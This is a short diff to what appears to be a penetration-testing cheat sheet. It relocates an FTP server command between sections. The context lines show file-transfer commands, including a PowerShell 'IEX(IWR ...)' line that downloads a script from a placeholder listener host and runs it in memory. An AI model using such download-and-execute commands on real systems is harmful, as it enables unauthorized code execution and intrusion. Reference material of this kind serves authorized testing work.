@@ -521,12 +521,6 @@ IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
 powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
 ```
 
-##### FTP
-```cmd
-python -m pyftpdlib -p 21 -w	\\ To start the ftp server on port 21
-ftp <RHOST>			\\ To login to the ftp server
-```
-
 ##### Bash only
 
 ###### wget version
@@ -604,6 +598,7 @@ wget -r --user="USERNAME" --password="PASSWORD" ftp://<RHOST>/
 lcd /opt/backup						\\ To change the local path to /opt/backup
 put sitebackup1.zip					\\ To upload the file.
 get sitebackup1.zip					\\ TO download the file.
+python -m pyftpdlib -p 21 -w				\\ To start the ftp server on port 21
 ```
 
 #### Kerberos
